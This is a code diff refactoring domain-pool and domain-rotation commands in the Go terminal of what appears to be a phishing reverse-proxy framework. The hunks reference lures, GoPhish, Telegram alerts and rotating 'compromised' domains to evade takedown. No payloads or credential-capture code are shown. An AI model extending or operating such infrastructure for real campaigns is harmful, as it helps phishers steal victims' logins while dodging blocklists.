@@ -237,9 +237,9 @@ func (t *Terminal) handleConfig(args []string) error {
 
 		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
 		primaryDomain := t.cfg.GetPrimaryDomain()
-		domainsCount := strconv.Itoa(len(t.cfg.GetDomains()))
+		domainsCount := strconv.Itoa(len(t.cfg.GetDomainManager().GetAllDomains()))
 		webAdminUrl := fmt.Sprintf("http://127.0.0.1:%d", t.cfg.GetWebAdminPort())
-		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		vals := []string{t.cfg.GetBaseDomain(), primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -252,7 +252,7 @@ func (t *Terminal) handleConfig(args []string) error {
 			return nil
 		case "domains":
 			// List all domains
-			domains := t.cfg.GetDomains()
+			domains := t.cfg.GetDomainManager().GetAllDomains()
 			if len(domains) == 0 {
 				log.Info("no domains configured")
 				return nil
@@ -261,19 +261,19 @@ func (t *Terminal) handleConfig(args []string) error {
 			log.Info("─────────────────────────────────────────────────────────────")
 			for i, d := range domains {
 				status := "disabled"
-				if d.Enabled {
+				if d.Status == DomainActive {
 					status = "enabled"
 				}
 				primary := ""
 				if d.IsPrimary {
 					primary = " [PRIMARY]"
 				}
-				log.Info("%d. %s (%s)%s", i+1, d.Domain, status, primary)
+				log.Info("%d. %s (%s)%s", i+1, d.FullDomain, status, primary)
 				if d.Description != "" {
 					log.Info("   Description: %s", d.Description)
 				}
-				if d.AddedAt != "" {
-					log.Info("   Added: %s", d.AddedAt)
+				if d.CreatedAt.Format("2006-01-02 15:04:05") != "" {
+					log.Info("   Added: %s", d.CreatedAt.Format("2006-01-02 15:04:05"))
 				}
 			}
 			log.Info("─────────────────────────────────────────────────────────────")
@@ -387,7 +387,7 @@ func (t *Terminal) handleConfig(args []string) error {
 			switch args[1] {
 			case "add":
 				description := args[3]
-				err := t.cfg.AddDomain(args[2], description)
+				err := t.cfg.GetDomainManager().AddDomain(args[2], "", "", description, false)
 				if err != nil {
 					return err
 				}
@@ -409,7 +409,7 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.manageCertificates(false)
 				return nil
 			case "remove":
-				err := t.cfg.RemoveDomain(args[2])
+				err := t.cfg.GetDomainManager().RemoveDomain(args[2])
 				if err != nil {
 					return err
 				}
@@ -423,13 +423,13 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.manageCertificates(false)
 				return nil
 			case "enable":
-				err := t.cfg.EnableDomain(args[2], true)
+				err := t.cfg.GetDomainManager().SetStatus(args[2], DomainActive)
 				if err != nil {
 					return err
 				}
 				return nil
 			case "disable":
-				err := t.cfg.EnableDomain(args[2], false)
+				err := t.cfg.GetDomainManager().SetStatus(args[2], DomainInactive)
 				if err != nil {
 					return err
 				}
@@ -695,23 +695,23 @@ func (t *Terminal) handleDomains(args []string) error {
 	// No arguments - show all domain info
 	if pn == 0 {
 		log.Info("")
-		log.Info("Base Domain: %s", t.cfg.general.Domain)
+		log.Info("Primary Domain: %s", t.cfg.GetBaseDomain())
 
-		domains := t.cfg.GetDomains()
+		domains := t.cfg.GetDomainManager().GetAllDomains()
 		if len(domains) > 0 {
 			log.Info("")
 			log.Info("Domain Pool:")
 			log.Info("─────────────────────────────────────────────────────────────")
 			for i, d := range domains {
 				status := "disabled"
-				if d.Enabled {
+				if d.Status == DomainActive {
 					status = "enabled"
 				}
 				primary := ""
 				if d.IsPrimary {
 					primary = " [PRIMARY]"
 				}
-				log.Info("%d. %s (%s)%s", i+1, d.Domain, status, primary)
+				log.Info("%d. %s (%s)%s", i+1, d.FullDomain, status, primary)
 				if d.Description != "" {
 					log.Info("   Description: %s", d.Description)
 				}
@@ -740,7 +740,7 @@ func (t *Terminal) handleDomains(args []string) error {
 		return nil
 
 	case "list":
-		domains := t.cfg.GetDomains()
+		domains := t.cfg.GetDomainManager().GetAllDomains()
 		if len(domains) == 0 {
 			log.Info("no domains configured")
 			return nil
@@ -749,19 +749,19 @@ func (t *Terminal) handleDomains(args []string) error {
 		log.Info("─────────────────────────────────────────────────────────────")
 		for i, d := range domains {
 			status := "disabled"
-			if d.Enabled {
+			if d.Status == DomainActive {
 				status = "enabled"
 			}
 			primary := ""
 			if d.IsPrimary {
 				primary = " [PRIMARY]"
 			}
-			log.Info("%d. %s (%s)%s", i+1, d.Domain, status, primary)
+			log.Info("%d. %s (%s)%s", i+1, d.FullDomain, status, primary)
 			if d.Description != "" {
 				log.Info("   Description: %s", d.Description)
 			}
-			if d.AddedAt != "" {
-				log.Info("   Added: %s", d.AddedAt)
+			if d.CreatedAt.Format("2006-01-02 15:04:05") != "" {
+				log.Info("   Added: %s", d.CreatedAt.Format("2006-01-02 15:04:05"))
 			}
 		}
 		log.Info("─────────────────────────────────────────────────────────────")
@@ -775,7 +775,7 @@ func (t *Terminal) handleDomains(args []string) error {
 		if pn >= 3 {
 			description = strings.Join(args[2:], " ")
 		}
-		err := t.cfg.AddDomain(args[1], description)
+		err := t.cfg.GetDomainManager().AddDomain(args[1], "", "", description, false)
 		if err != nil {
 			return err
 		}
@@ -787,7 +787,7 @@ func (t *Terminal) handleDomains(args []string) error {
 		if pn < 2 {
 			return fmt.Errorf("syntax: domains remove <domain>")
 		}
-		err := t.cfg.RemoveDomain(args[1])
+		err := t.cfg.GetDomainManager().RemoveDomain(args[1])
 		if err != nil {
 			return err
 		}
@@ -799,7 +799,7 @@ func (t *Terminal) handleDomains(args []string) error {
 		if pn < 2 {
 			return fmt.Errorf("syntax: domains set-primary <domain>")
 		}
-		err := t.cfg.SetPrimaryDomain(args[1])
+		err := t.cfg.GetDomainManager().SetPrimary(args[1])
 		if err != nil {
 			return err
 		}
@@ -811,7 +811,7 @@ func (t *Terminal) handleDomains(args []string) error {
 		if pn < 2 {
 			return fmt.Errorf("syntax: domains enable <domain>")
 		}
-		err := t.cfg.EnableDomain(args[1], true)
+		err := t.cfg.GetDomainManager().SetStatus(args[1], DomainActive)
 		if err != nil {
 			return err
 		}
@@ -822,7 +822,7 @@ func (t *Terminal) handleDomains(args []string) error {
 		if pn < 2 {
 			return fmt.Errorf("syntax: domains disable <domain>")
 		}
-		err := t.cfg.EnableDomain(args[1], false)
+		err := t.cfg.GetDomainManager().SetStatus(args[1], DomainInactive)
 		if err != nil {
 			return err
 		}
@@ -1064,181 +1064,86 @@ func (t *Terminal) handleCaptcha(args []string) error {
 
 func (t *Terminal) handleDomainRotation(args []string) error {
 	pn := len(args)
+	dm := t.cfg.GetDomainManager()
 
-	// No arguments - show current configuration
 	if pn == 0 {
-		if t.p.domainRotation != nil {
-			stats := t.p.domainRotation.GetStats()
-			log.Info("Domain Rotation Configuration:")
-			log.Info("  Enabled: %v", stats["enabled"])
-			log.Info("  Strategy: %s", stats["strategy"])
-			log.Info("  Rotation Interval: %d minutes", t.cfg.GetDomainRotationConfig().RotationInterval)
-			log.Info("  Max Domains: %d", stats["max_domains"])
-			log.Info("  Auto Generate: %v", stats["auto_generate"])
-			log.Info("  Active Domains: %d", stats["active_domains"])
-			log.Info("  Healthy Domains: %d", stats["healthy_domains"])
-			log.Info("")
-			log.Info("Use 'domain-rotation enable on' to enable domain rotation")
-			log.Info("Use 'domain-rotation add-domain' to add domains to rotation pool")
-		} else {
-			log.Info("Domain rotation not configured")
-			log.Info("Use 'domain-rotation enable on' to enable")
-		}
+		stats := dm.GetStats()
+		log.Info("Domain Rotation Configuration:")
+		log.Info("  Enabled: %v", stats["rotation_enabled"])
+		log.Info("  Strategy: %s", stats["strategy"])
+		log.Info("  Rotation Interval: %d minutes", stats["rotation_interval"])
+		log.Info("  Max Domains: %d", stats["max_domains"])
+		log.Info("  Auto Generate: %v", stats["auto_generate"])
+		log.Info("  Active Domains: %d", stats["active_domains"])
+		log.Info("  Healthy Domains: %d", stats["healthy_domains"])
+		log.Info("  Total Rotations: %d", stats["total_rotations"])
+		log.Info("  Compromised: %d", stats["compromised_count"])
 		return nil
 	}
 
-	// Handle subcommands
 	switch args[0] {
-	case "enable":
-		if pn < 2 {
-			return fmt.Errorf("syntax: domain-rotation enable <on|off>")
-		}
-		switch args[1] {
-		case "on":
-			t.cfg.SetDomainRotationEnabled(true)
-			// Initialize if not already done
-			if t.p.domainRotation == nil {
-				t.p.domainRotation = infra.NewDomainRotationManager(t.cfg.GetDomainRotationConfig())
-			}
-			t.p.domainRotation.Start()
-			log.Success("Domain rotation enabled")
-		case "off":
-			t.cfg.SetDomainRotationEnabled(false)
-			if t.p.domainRotation != nil {
-				t.p.domainRotation.Stop()
-			}
-			log.Success("Domain rotation disabled")
-		default:
-			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
-		}
+	case "on":
+		dm.SetRotationEnabled(true)
+		dm.Start()
+		log.Success("Domain rotation enabled")
 		return nil
-
+	case "off":
+		dm.SetRotationEnabled(false)
+		dm.Stop()
+		log.Success("Domain rotation disabled")
+		return nil
 	case "strategy":
 		if pn < 2 {
-			return fmt.Errorf("syntax: domain-rotation strategy <type>")
+			return fmt.Errorf("syntax: domains rotation strategy <round-robin|weighted|health-based|random>")
 		}
-		strategy := args[1]
-		if strategy != "round-robin" && strategy != "weighted" && strategy != "health-based" && strategy != "random" {
-			return fmt.Errorf("invalid strategy: %s (use: round-robin, weighted, health-based, random)", strategy)
+		s := args[1]
+		if s != "round-robin" && s != "weighted" && s != "health-based" && s != "random" {
+			return fmt.Errorf("invalid strategy: %s", s)
 		}
-		t.cfg.SetDomainRotationStrategy(strategy)
-		log.Success("Domain rotation strategy set to: %s", strategy)
+		dm.SetStrategy(s)
+		log.Success("Strategy set to: %s", s)
 		return nil
-
 	case "interval":
 		if pn < 2 {
-			return fmt.Errorf("syntax: domain-rotation interval <minutes>")
+			return fmt.Errorf("syntax: domains rotation interval <minutes>")
 		}
-		interval, err := strconv.Atoi(args[1])
-		if err != nil || interval < 1 {
-			return fmt.Errorf("invalid interval: %s (must be positive integer)", args[1])
+		ival, err := strconv.Atoi(args[1])
+		if err != nil || ival < 1 {
+			return fmt.Errorf("invalid interval: %s", args[1])
 		}
-		t.cfg.SetDomainRotationInterval(interval)
-		log.Success("Domain rotation interval set to: %d minutes", interval)
+		dm.SetRotationInterval(ival)
+		log.Success("Rotation interval set to: %d minutes", ival)
 		return nil
-
-	case "max-domains":
+	case "max":
 		if pn < 2 {
-			return fmt.Errorf("syntax: domain-rotation max-domains <count>")
+			return fmt.Errorf("syntax: domains rotation max <n>")
 		}
-		count, err := strconv.Atoi(args[1])
-		if err != nil || count < 1 {
-			return fmt.Errorf("invalid count: %s (must be positive integer)", args[1])
+		mx, err := strconv.Atoi(args[1])
+		if err != nil || mx < 1 {
+			return fmt.Errorf("invalid count: %s", args[1])
 		}
-		t.cfg.SetDomainRotationMaxDomains(count)
-		log.Success("Maximum domains set to: %d", count)
+		dm.SetMaxDomains(mx)
+		log.Success("Max domains set to: %d", mx)
 		return nil
-
 	case "auto-generate":
 		if pn < 2 {
-			return fmt.Errorf("syntax: domain-rotation auto-generate <on|off>")
+			return fmt.Errorf("syntax: domains rotation auto-generate <on|off>")
 		}
 		switch args[1] {
 		case "on":
-			t.cfg.SetDomainRotationAutoGenerate(true)
-			log.Success("Automatic domain generation enabled")
+			dm.SetAutoGenerate(true)
+			log.Success("Auto-generation enabled")
 		case "off":
-			t.cfg.SetDomainRotationAutoGenerate(false)
-			log.Success("Automatic domain generation disabled")
+			dm.SetAutoGenerate(false)
+			log.Success("Auto-generation disabled")
 		default:
-			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
+			return fmt.Errorf("invalid value: %s (use on or off)", args[1])
 		}
 		return nil
-
-	case "add-domain":
-		if pn < 4 {
-			return fmt.Errorf("syntax: domain-rotation add-domain <domain> <subdomain> <provider>")
-		}
-		domain := args[1]
-		subdomain := args[2]
-		provider := args[3]
-
-		if t.p.domainRotation == nil {
-			return fmt.Errorf("domain rotation not initialized, enable it first")
-		}
-
-		err := t.p.domainRotation.AddDomain(domain, subdomain, provider)
-		if err != nil {
-			return err
-		}
-		log.Success("Domain %s.%s added to rotation pool", subdomain, domain)
-		return nil
-
-	case "remove-domain":
-		if pn < 2 {
-			return fmt.Errorf("syntax: domain-rotation remove-domain <full_domain>")
-		}
-		fullDomain := args[1]
-
-		if t.p.domainRotation == nil {
-			return fmt.Errorf("domain rotation not initialized")
-		}
-
-		err := t.p.domainRotation.RemoveDomain(fullDomain)
-		if err != nil {
-			return err
-		}
-		log.Success("Domain %s removed from rotation pool", fullDomain)
-		return nil
-
-	case "list":
-		if t.p.domainRotation == nil {
-			return fmt.Errorf("domain rotation not initialized")
-		}
-
-		domains := t.p.domainRotation.GetDomains()
-		if len(domains) == 0 {
-			log.Info("No domains in rotation pool")
-			return nil
-		}
-
-		log.Info("=== Domains in Rotation Pool ===")
-		log.Info("")
-		log.Info("%-30s %-10s %-7s %-15s %-10s %s", "Domain", "Status", "Health", "Provider", "Requests", "Created")
-		log.Info("%s %s %s %s %s %s", strings.Repeat("-", 30), strings.Repeat("-", 10), strings.Repeat("-", 7), strings.Repeat("-", 15), strings.Repeat("-", 10), strings.Repeat("-", 20))
-
-		for _, rd := range domains {
-			log.Info("%-30s %-10s %-7d %-15s %-10d %s",
-				rd.FullDomain,
-				rd.Status,
-				rd.Health,
-				rd.DNSProvider,
-				rd.RequestCount,
-				rd.CreatedAt.Format("2006-01-02 15:04:05"))
-		}
-		return nil
-
 	case "add-provider":
 		if pn < 6 {
-			return fmt.Errorf("syntax: domain-rotation add-provider <name> <type> <api_key> <api_secret> <zone> [options]")
+			return fmt.Errorf("syntax: domains rotation add-provider <name> <type> <api_key> <api_secret> <zone>")
 		}
-		name := args[1]
-		providerType := args[2]
-		apiKey := args[3]
-		apiSecret := args[4]
-		zone := args[5]
-
-		// Parse options
 		options := make(map[string]string)
 		for i := 6; i < pn; i++ {
 			parts := strings.SplitN(args[i], "=", 2)
@@ -1246,39 +1151,15 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 				options[parts[0]] = parts[1]
 			}
 		}
-
-		t.cfg.AddDomainRotationDNSProvider(name, providerType, apiKey, apiSecret, zone, options)
-		log.Success("DNS provider %s added", name)
+		dm.AddDNSProvider(args[1], args[2], args[3], args[4], args[5], options)
+		log.Success("DNS provider %s added", args[1])
 		return nil
-
-	case "mark-compromised":
-		if pn < 3 {
-			return fmt.Errorf("syntax: domain-rotation mark-compromised <full_domain> <reason>")
-		}
-		fullDomain := args[1]
-		reason := strings.Join(args[2:], " ")
-
-		if t.p.domainRotation == nil {
-			return fmt.Errorf("domain rotation not initialized")
-		}
-
-		err := t.p.domainRotation.MarkCompromised(fullDomain, reason)
-		if err != nil {
-			return err
-		}
-		log.Success("Domain %s marked as compromised", fullDomain)
-		return nil
-
 	case "stats":
-		if t.p.domainRotation == nil {
-			return fmt.Errorf("domain rotation not initialized")
-		}
-
-		stats := t.p.domainRotation.GetStats()
+		stats := dm.GetStats()
 		log.Info("=== Domain Rotation Statistics ===")
 		log.Info("")
 		log.Info("System Status:")
-		log.Info("  Enabled: %v", stats["enabled"])
+		log.Info("  Enabled: %v", stats["rotation_enabled"])
 		log.Info("  Strategy: %s", stats["strategy"])
 		log.Info("  Total Rotations: %d", stats["total_rotations"])
 		log.Info("  Last Rotation: %s", stats["last_rotation"])
@@ -1288,20 +1169,62 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		log.Info("  Healthy Domains: %d", stats["healthy_domains"])
 		log.Info("  Compromised Count: %d", stats["compromised_count"])
 		log.Info("  Max Domains: %d", stats["max_domains"])
+		return nil
+	case "list":
+		domains := dm.GetAllDomains()
+		if len(domains) == 0 {
+			log.Info("No domains in rotation pool")
+			return nil
+		}
+		log.Info("=== Domains in Rotation Pool ===")
 		log.Info("")
-		log.Info("Provider Statistics:")
-		if providerStats, ok := stats["provider_stats"].(map[string]int); ok {
-			for provider, count := range providerStats {
-				log.Info("  %s: %d domains", provider, count)
-			}
+		log.Info("%-30s %-10s %-7s %-15s %-10s %s", "Domain", "Status", "Health", "Provider", "Requests", "Created")
+		log.Info("%s %s %s %s %s %s", strings.Repeat("-", 30), strings.Repeat("-", 10), strings.Repeat("-", 7), strings.Repeat("-", 15), strings.Repeat("-", 10), strings.Repeat("-", 20))
+		for _, d := range domains {
+			log.Info("%-30s %-10s %-7d %-15s %-10d %s",
+				d.FullDomain,
+				string(d.Status),
+				d.Health,
+				d.DNSProvider,
+				d.RequestCount,
+				d.CreatedAt.Format("2006-01-02 15:04:05"))
 		}
 		return nil
-
+	case "add-domain":
+		if pn < 4 {
+			return fmt.Errorf("syntax: domains rotation add-domain <domain> <subdomain> <provider>")
+		}
+		err := dm.AddDomain(args[1], args[2], args[3], "", false)
+		if err != nil {
+			return err
+		}
+		log.Success("Domain %s.%s added to rotation pool", args[2], args[1])
+		return nil
+	case "remove-domain":
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains rotation remove-domain <full_domain>")
+		}
+		err := dm.RemoveDomain(args[1])
+		if err != nil {
+			return err
+		}
+		log.Success("Domain %s removed from rotation pool", args[1])
+		return nil
+	case "mark-compromised":
+		if pn < 3 {
+			return fmt.Errorf("syntax: domains rotation mark-compromised <full_domain> <reason>")
+		}
+		reason := strings.Join(args[2:], " ")
+		err := dm.MarkCompromised(args[1], reason)
+		if err != nil {
+			return err
+		}
+		log.Success("Domain %s marked as compromised", args[1])
+		return nil
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
 	}
 }
-
 func (t *Terminal) handleTrafficShaping(args []string) error {
 	pn := len(args)
 
@@ -2574,8 +2497,8 @@ func (t *Terminal) handleLures(args []string) error {
 					if val != "" {
 						val = strings.ToLower(val)
 
-						if val != t.cfg.general.Domain && !strings.HasSuffix(val, "."+t.cfg.general.Domain) {
-							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.general.Domain)
+						if val != t.cfg.GetBaseDomain() && !strings.HasSuffix(val, "."+t.cfg.GetBaseDomain()) {
+							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.GetBaseDomain())
 						}
 						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
 						if !host_re.MatchString(val) {
